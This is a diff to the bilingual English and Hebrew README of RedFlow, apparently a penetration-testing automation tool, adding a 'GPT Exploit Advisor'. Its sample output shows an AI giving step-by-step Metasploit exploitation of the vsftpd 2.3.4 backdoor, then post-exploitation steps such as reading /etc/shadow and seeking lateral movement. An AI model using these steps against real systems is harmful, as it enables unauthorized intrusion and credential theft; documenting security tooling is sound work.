@@ -16,11 +16,11 @@ RedFlow הוא כלי Python מבוסס-CLI (עם אפשרות להרחבות GU
 - **File discovery and downloading from web and FTP services**
 - **Recursive directory scanning**
 - **Integration with searchsploit for finding vulnerabilities and exploits**
+- **GPT-powered Exploit Advisor for intelligent vulnerability assessment**
 - Wordlist and attack method selection via simple CLI or GUI
 - Analysis of each tool's output
 - Context-aware help for understanding outputs and common error messages
 - Default path detection for wordlists/tools/scripts in Kali Linux
-- GPT integration for advanced analysis and recommendations
 
 ---
 
@@ -34,11 +34,53 @@ RedFlow הוא כלי Python מבוסס-CLI (עם אפשרות להרחבות GU
 - **גילוי והורדת קבצים משירותי אינטרנט ו-FTP**
 - **סריקת תיקיות באופן רקורסיבי**
 - **אינטגרציה עם searchsploit למציאת פגיעויות ומנגנוני ניצול**
+- **יועץ ניצול מבוסס GPT להערכה חכמה של פגיעויות**
 - אפשרות לבחירת רשימות מילים ושיטות תקיפה באמצעות ממשק CLI פשוט או GUI
 - ניתוח פלט של כל כלי
 - עזרה מבוססת-הקשר להבנת פלטים והודעות שגיאה נפוצות
 - זיהוי ושימוש בנתיבי ברירת מחדל של רשימות מילים/כלים/סקריפטים מסביבת Kali Linux
-- תמיכה ב-GPT לניתוח ממצאים והמלצות מתקדמות
+
+## Architecture & Workflow / ארכיטקטורה וזרימת עבודה
+
+RedFlow uses a modular architecture with the following main components:
+
+1. **Core Scanner**: Manages the overall scanning flow and orchestrates other modules
+2. **Enumeration Module**: Performs detailed enumeration of discovered services
+3. **Exploitation Module**: Handles exploitation of identified vulnerabilities
+4. **GPT Advisor Module**: Provides AI-powered analysis and recommendations
+5. **File Operations Module**: Manages file discovery and downloading
+6. **Utilities**: Configuration, logging, and helper functions
+
+The typical workflow is:
+
+1. **Target Identification**: Specify target IP/domain and scan parameters
+2. **Reconnaissance**: Perform passive (whois, DNS) and active (port scanning) reconnaissance
+3. **Service Enumeration**: Detailed analysis of discovered services
+4. **Vulnerability Identification**: Identify potential vulnerabilities in discovered services
+5. **Exploitation**: Interactive exploitation of vulnerabilities
+6. **GPT Analysis**: AI-powered analysis and recommendations for complex vulnerabilities
+7. **Reporting**: Summary of findings and recommendations
+
+---
+
+RedFlow משתמש בארכיטקטורה מודולרית עם הרכיבים העיקריים הבאים:
+
+1. **סורק ליבה**: מנהל את זרימת הסריקה הכוללת ומתזמר מודולים אחרים
+2. **מודול תשאול**: מבצע תשאול מפורט של שירותים שהתגלו
+3. **מודול ניצול**: מטפל בניצול של פגיעויות שזוהו
+4. **מודול יועץ GPT**: מספק ניתוח והמלצות מבוססי בינה מלאכותית
+5. **מודול פעולות קבצים**: מנהל גילוי והורדת קבצים
+6. **כלי עזר**: תצורה, רישום יומן ופונקציות עזר
+
+זרימת העבודה הטיפוסית היא:
+
+1. **זיהוי מטרה**: הגדרת IP/דומיין של מטרה ופרמטרים לסריקה
+2. **סיור מקדים**: ביצוע סיור פסיבי (whois, DNS) ואקטיבי (סריקת פורטים)
+3. **תשאול שירות**: ניתוח מפורט של שירותים שהתגלו
+4. **זיהוי פגיעויות**: זיהוי פגיעויות פוטנציאליות בשירותים שהתגלו
+5. **ניצול**: ניצול אינטראקטיבי של פגיעויות
+6. **ניתוח GPT**: ניתוח והמלצות מבוססי בינה מלאכותית לפגיעויות מורכבות
+7. **דיווח**: סיכום ממצאים והמלצות
 
 ## Installation / התקנה
 
@@ -70,7 +112,7 @@ python redflow.py --target example.com --mode full
 usage: redflow.py [-h] --target TARGET [--mode {passive,active,full}] [--port PORT] [--output OUTPUT] [--interactive] [--gpt] [--verbose] [--version]
                  [--list-files] [--interactive-download] [--port PORT] [--protocol {http,https,ftp}] [--download DOWNLOAD_URL]
                  [--view VIEW_URL] [--results-dir RESULTS_DIR] [--exploit-menu] [--search-exploits SEARCH_EXPLOITS]
-                 [--port-to-exploit PORT_TO_EXPLOIT] [--service-to-exploit SERVICE_TO_EXPLOIT]
+                 [--port-to-exploit PORT_TO_EXPLOIT] [--service-to-exploit SERVICE_TO_EXPLOIT] [--gpt-advisor] [--gpt-model GPT_MODEL]
 ```
 
 | Parameter | Shortcut | Description | Default | Example |
@@ -80,7 +122,9 @@ usage: redflow.py [-h] --target TARGET [--mode {passive,active,full}] [--port PO
 | `--port` | `-p` | Focus on a specific port for scanning and exploitation | | `--port 21` |
 | `--output` | `-o` | Path to output directory | `./scans/` | `--output ./my_scans/` |
 | `--interactive` | `-i` | Request confirmation before proceeding to next step | `False` | `--interactive` |
-| `--gpt` | | Use GPT-4 for recommendations (requires API key) | `False` | `--gpt` |
+| `--gpt` | | Use GPT for general analysis and recommendations | `False` | `--gpt` |
+| `--gpt-advisor` | | Use GPT Exploit Advisor for vulnerability assessment | `False` | `--gpt-advisor` |
+| `--gpt-model` | | Specify the GPT model to use | `gpt-4o-mini` | `--gpt-model gpt-4` |
 | `--verbose` | `-v` | Display detailed information in logs | `False` | `--verbose` |
 | `--version` | | Display software version | | `--version` |
 | `--help` | `-h` | Display help | | `--help` |
@@ -105,6 +149,7 @@ usage: redflow.py [-h] --target TARGET [--mode {passive,active,full}] [--port PO
 | `--search-exploits` | Search for exploits for a specific service | | `--search-exploits vsftpd:2.3.4` |
 | `--port-to-exploit` | Port of the service to exploit | | `--port-to-exploit 21` |
 | `--service-to-exploit` | Name of the service to exploit | | `--service-to-exploit vsftpd` |
+| `--gpt-advisor` | Use GPT-powered Exploit Advisor for vulnerability analysis | | `--gpt-advisor` |
 
 ---
 
@@ -115,7 +160,9 @@ usage: redflow.py [-h] --target TARGET [--mode {passive,active,full}] [--port PO
 | `--port` | `-p` | התמקדות בפורט ספציפי לסריקה ולניצול | | `--port 21` |
 | `--output` | `-o` | נתיב לתיקיית הפלט | `./scans/` | `--output ./my_scans/` |
 | `--interactive` | `-i` | בקשת אישור לפני המשך לשלב הבא | `False` | `--interactive` |
-| `--gpt` | | שימוש ב-GPT-4 לקבלת המלצות (דורש מפתח API) | `False` | `--gpt` |
+| `--gpt` | | שימוש ב-GPT לניתוח כללי והמלצות | `False` | `--gpt` |
+| `--gpt-advisor` | | שימוש ביועץ ניצול GPT להערכת פגיעויות | `False` | `--gpt-advisor` |
+| `--gpt-model` | | הגדרת מודל ה-GPT לשימוש | `gpt-4o-mini` | `--gpt-model gpt-4` |
 | `--verbose` | `-v` | הצגת מידע מפורט בלוגים | `False` | `--verbose` |
 | `--version` | | הצגת גרסת התוכנה | | `--version` |
 | `--help` | `-h` | הצגת עזרה | | `--help` |
@@ -140,6 +187,7 @@ usage: redflow.py [-h] --target TARGET [--mode {passive,active,full}] [--port PO
 | `--search-exploits` | חיפוש מנגנוני ניצול לשירות ספציפי | | `--search-exploits vsftpd:2.3.4` |
 | `--port-to-exploit` | הפורט של השירות לניצול | | `--port-to-exploit 21` |
 | `--service-to-exploit` | שם השירות לניצול | | `--service-to-exploit vsftpd` |
+| `--gpt-advisor` | שימוש ביועץ ניצול מבוסס GPT לניתוח פגיעויות | | `--gpt-advisor` |
 
 ### Usage Examples / דוגמאות לשימוש ב-CLI
 
@@ -191,6 +239,21 @@ usage: redflow.py [-h] --target TARGET [--mode {passive,active,full}] [--port PO
 10. **Scan and exploit a specific port**:
    ```bash
    python redflow.py --target 10.0.2.4 --port 21
+   ```
+   
+11. **Use GPT Exploit Advisor for vulnerability analysis**:
+   ```bash
+   python redflow.py --gpt-advisor
+   ```
+
+12. **Full scan with GPT Exploit Advisor enabled**:
+   ```bash
+   python redflow.py --target 192.168.1.10 --mode full --gpt-advisor
+   ```
+
+13. **Scan specific port and use GPT Exploit Advisor**:
+   ```bash
+   python redflow.py --target 192.168.1.10 --port 21 --gpt-advisor
    ```
 
 ---
@@ -245,6 +308,21 @@ usage: redflow.py [-h] --target TARGET [--mode {passive,active,full}] [--port PO
    python redflow.py --target 10.0.2.4 --port 21
    ```
 
+11. **שימוש ביועץ ניצול GPT לניתוח פגיעויות**:
+   ```bash
+   python redflow.py --gpt-advisor
+   ```
+
+12. **סריקה מלאה עם יועץ ניצול GPT מופעל**:
+   ```bash
+   python redflow.py --target 192.168.1.10 --mode full --gpt-advisor
+   ```
+
+13. **סריקת פורט ספציפי ושימוש ביועץ ניצול GPT**:
+   ```bash
+   python redflow.py --target 192.168.1.10 --port 21 --gpt-advisor
+   ```
+
 ## New Features / תכונות חדשות
 
 ### File Discovery and Download / גילוי והורדת קבצים
@@ -292,6 +370,7 @@ The tool now integrates with searchsploit to find and exploit vulnerabilities:
 - **Custom search options**: Allows users to enter custom search terms when looking for exploits.
 - **Exploit selection**: Displays a numbered list of available exploits for easy selection.
 - **Exploit preparation**: Automatically prepares exploits for execution by copying and configuring them.
+- **GPT Exploit Advisor**: AI-powered analysis of vulnerabilities and detailed exploitation guides.
 
 ***
 
@@ -301,6 +380,7 @@ The tool now integrates with searchsploit to find and exploit vulnerabilities:
 - **אפשרויות חיפוש מותאמות אישית**: מאפשר למשתמשים להזין מונחי חיפוש מותאמים אישית בעת חיפוש אחר exploits.
 - **בחירת exploit**: מציג רשימה ממוספרת של exploits זמינים לבחירה קלה.
 - **הכנת מנגנוני ניצול**: מכין באופן אוטומטי מנגנוני ניצול להרצה על ידי העתקה והגדרה שלהם.
+- **יועץ ניצול GPT**: ניתוח מבוסס בינה מלאכותית של פגיעויות ומדריכי ניצול מפורטים.
 
 #### Instructions / הוראות שימוש:
 
@@ -319,6 +399,104 @@ python redflow.py --service-to-exploit vsftpd --port-to-exploit 21
 
 # Scan and focus exploitation on a specific port / סריקה ומיקוד ניצול על פורט ספציפי
 python redflow.py --target 10.0.2.4 --port 21
+
+# Use GPT Exploit Advisor / שימוש ביועץ ניצול GPT
+python redflow.py --gpt-advisor
+```
+
+### GPT Exploit Advisor / יועץ ניצול GPT
+
+The GPT Exploit Advisor is a powerful feature that uses OpenAI's GPT models to provide detailed analysis and exploitation guidance:
+
+- **Vulnerability assessment**: Thorough analysis of discovered vulnerabilities and their applicability to the target
+- **Exploitation instructions**: Step-by-step instructions for exploiting vulnerabilities, including command examples
+- **Post-exploitation guidance**: Suggestions for actions to take after successful exploitation
+- **Metasploit integration**: Special handling for Metasploit modules with custom resource script generation
+- **Customizable parameters**: Control GPT behavior through parameters like temperature, token limits and more
+
+***
+
+יועץ ניצול ה-GPT הוא תכונה חזקה המשתמשת במודלים של OpenAI GPT כדי לספק ניתוח מפורט והנחיות ניצול:
+
+- **הערכת פגיעות**: ניתוח מעמיק של פגיעויות שהתגלו והתאמתן למטרה
+- **הוראות ניצול**: הוראות שלב-אחר-שלב לניצול פגיעויות, כולל דוגמאות פקודה
+- **הנחיות לאחר הניצול**: הצעות לפעולות שיש לבצע לאחר ניצול מוצלח
+- **אינטגרציה עם Metasploit**: טיפול מיוחד במודולים של Metasploit עם יצירת סקריפט משאבים מותאם אישית
+- **פרמטרים מותאמים אישית**: שליטה בהתנהגות GPT באמצעות פרמטרים כמו טמפרטורה, מגבלות תווים ועוד
+
+#### Sample Usage / דוגמת שימוש:
+
+```bash
+# Basic usage with default settings / שימוש בסיסי עם הגדרות ברירת מחדל
+python redflow.py --target example.com --gpt-advisor
+
+# Specify GPT model / הגדרת מודל GPT
+python redflow.py --gpt-advisor --gpt-model gpt-4o-mini
+
+# Full scan with GPT advisor / סריקה מלאה עם יועץ GPT
+python redflow.py --target 192.168.1.10 --mode full --gpt-advisor
+```
+
+You can customize GPT behavior in the config.yaml file:
+תוכל להתאים אישית את התנהגות ה-GPT בקובץ config.yaml:
+
+```yaml
+gpt:
+  api_key: "YOUR_API_KEY_HERE"
+  model: "gpt-4o-mini"  # or other available models
+  temperature: 0.3      # 0.0-1.0 (lower = more focused)
+  max_tokens: 500       # Maximum response length
+  top_p: 1.0            # Controls token selection
+  frequency_penalty: 0.0
+  presence_penalty: 0.0
+```
+
+#### Sample Output / דוגמת פלט:
+
+```
+[bold blue]======== RedFlow + GPT Exploit Advisor ========[/bold blue]
+[bold cyan]Found services:[/bold cyan]
+1. [bold]vsftpd 2.3.4[/bold] on port 21
+
+[bold green]Found 3 potential exploits:[/bold green]
+[1] vsftpd 2.3.4 - Backdoor Command Execution
+
+[bold green]GPT Analysis:[/bold green]
+───────────────────────────────────────────────────
+│ # Vulnerability Assessment                       │
+│                                                   │
+│ ## Target                                         │
+│ - **Service**: vsftpd 2.3.4                       │
+│ - **Exploit**: vsftpd 2.3.4 - Backdoor Command Execution │
+│                                                   │
+│ ## Analysis                                       │
+│ This vulnerability exists due to a backdoor in vsftpd 2.3.4. │
+│ When a username containing the string `:)` is provided, │
+│ a backdoor is triggered that opens shell on port 6200. │
+│                                                   │
+│ ## Execution Instructions                         │
+│                                                   │
+│ 1. Check if the backdoor is active:              │
+│    ```                                            │
+│    nc -v <TARGET_IP> 21                           │
+│    ```                                            │
+│                                                   │
+│ 2. Run the exploit:                               │
+│    ```                                            │
+│    msfconsole -q                                  │
+│    use exploit/unix/ftp/vsftpd_234_backdoor      │
+│    set RHOSTS <TARGET_IP>                         │
+│    run                                            │
+│    ```                                            │
+│                                                   │
+│ ## Expected Outcome                               │
+│ Root access to the system.                        │
+│                                                   │
+│ ## Post-Exploitation Steps                        │
+│ 1. Check permissions: `id` and `whoami`           │
+│ 2. Look for sensitive files in `/etc/passwd`, `/etc/shadow` │
+│ 3. Check for lateral movement opportunities       │
+───────────────────────────────────────────────────
 ```
 
 ### Port-Focused Scanning and Exploitation / סריקה וניצול ממוקדי-פורט
@@ -456,23 +634,32 @@ MIT
 
 In the latest release, the following improvements have been made / בגרסה האחרונה בוצעו השיפורים הבאים:
 
-1. **Fixed exploit execution issues** - Exploits are now attempted twice automatically if they fail the first time
+1. **Added GPT Exploit Advisor** - New AI-powered feature for detailed vulnerability analysis and exploitation guidance
+   / **נוסף יועץ ניצול GPT** - תכונה חדשה מבוססת בינה מלאכותית לניתוח מפורט של פגיעויות והדרכת ניצול
+
+2. **Fixed exploit execution issues** - Exploits are now attempted twice automatically if they fail the first time
    / **תוקנו בעיות בהרצת אקספלויטים** - אקספלויטים כעת מנסים לרוץ פעמיים אוטומטית אם נכשלים בפעם הראשונה
 
-2. **Improved recursive directory scanning** - The recursive directory scanner now uses optimized scanning depths and improved performance
+3. **Improved recursive directory scanning** - The recursive directory scanner now uses optimized scanning depths and improved performance
    / **שיפור בסריקת תיקיות רקורסיבית** - הסורק הרקורסיבי כעת משתמש בעומקי סריקה מותאמים וביצועים משופרים
 
-3. **Enhanced Metasploit integration** - Better feedback and retry mechanisms for Metasploit exploits
+4. **Enhanced Metasploit integration** - Better feedback and retry mechanisms for Metasploit exploits
    / **שיפור אינטגרציה עם Metasploit** - משוב טוב יותר ומנגנוני ניסיון נוסף למודולים של Metasploit
 
-4. **Improved GUI results display** - Results are now displayed with better formatting and color-coding in the GUI
+5. **Improved GUI results display** - Results are now displayed with better formatting and color-coding in the GUI
    / **שיפור תצוגת תוצאות בממשק הגרפי** - התוצאות כעת מוצגות עם עיצוב טוב יותר וקידוד צבעים בממשק הגרפי
 
-5. **New interactive menu interface** - Added a step-by-step guided menu interface for easier tool usage
+6. **New interactive menu interface** - Added a step-by-step guided menu interface for easier tool usage
    / **ממשק תפריט אינטראקטיבי חדש** - נוסף ממשק תפריט מונחה שלב-אחר-שלב לשימוש קל יותר בכלי
 
-6. **Special handling for problematic exploits** - Added custom handlers for known problematic exploits like vsftpd 2.3.4
+7. **Special handling for problematic exploits** - Added custom handlers for known problematic exploits like vsftpd 2.3.4
    / **טיפול מיוחד לאקספלויטים בעייתיים** - נוספו מטפלים מותאמים לאקספלויטים בעייתיים ידועים כמו vsftpd 2.3.4
+
+8. **Added support for custom GPT prompts** - Users can now define custom GPT system prompts in the configuration file
+   / **נוספה תמיכה בפרומפטים מותאמים אישית ל-GPT** - משתמשים יכולים כעת להגדיר פרומפטים מותאמים אישית לGPT בקובץ התצורה
+
+9. **Advanced GPT parameter control** - Fine-tune GPT model behavior with parameters like temperature, token limits, and more
+   / **בקרת פרמטרים מתקדמת ל-GPT** - כוונון עדין של התנהגות מודל GPT עם פרמטרים כמו טמפרטורה, מגבלות תווים ועוד
 
 ### Using the new menu interface / שימוש בממשק התפריט החדש
 
@@ -489,7 +676,43 @@ This will guide you through a step-by-step process to:
 1. Select target type (IP address or domain)
 2. Choose specific port or scan all ports
 3. Select scan mode (passive, active, full, or quick)
-4. Configure additional options
+4. Configure additional options (including enabling GPT Exploit Advisor)
 
 The menu provides a more user-friendly way to use RedFlow, especially for new users.
-התפריט מספק דרך ידידותית יותר להשתמש ב-RedFlow, במיוחד למשתמשים חדשים. 
+התפריט מספק דרך ידידותית יותר להשתמש ב-RedFlow, במיוחד למשתמשים חדשים.
+
+### Using the GPT Exploit Advisor / שימוש ביועץ ניצול GPT
+
+The GPT Exploit Advisor can be used in several ways:
+
+1. **After completing a scan**:
+   ```bash
+   python redflow.py --gpt-advisor
+   ```
+
+2. **During initial scan**:
+   ```bash
+   python redflow.py --target example.com --gpt-advisor
+   ```
+
+3. **From the interactive menu** - Select the GPT Exploit Advisor option when prompted.
+
+This powerful feature provides detailed, AI-generated guidance on exploiting discovered vulnerabilities, with step-by-step instructions tailored to your specific target.
+
+---
+
+ניתן להשתמש ביועץ ניצול GPT במספר דרכים:
+
+1. **לאחר השלמת סריקה**:
+   ```bash
+   python redflow.py --gpt-advisor
+   ```
+
+2. **במהלך סריקה ראשונית**:
+   ```bash
+   python redflow.py --target example.com --gpt-advisor
+   ```
+
+3. **מהתפריט האינטראקטיבי** - בחר באפשרות "יועץ ניצול GPT" כאשר תתבקש.
+
+תכונה חזקה זו מספקת הדרכה מפורטת, מבוססת בינה מלאכותית, לניצול פגיעויות שהתגלו, עם הוראות שלב-אחר-שלב המותאמות למטרה הספציפית שלך. 
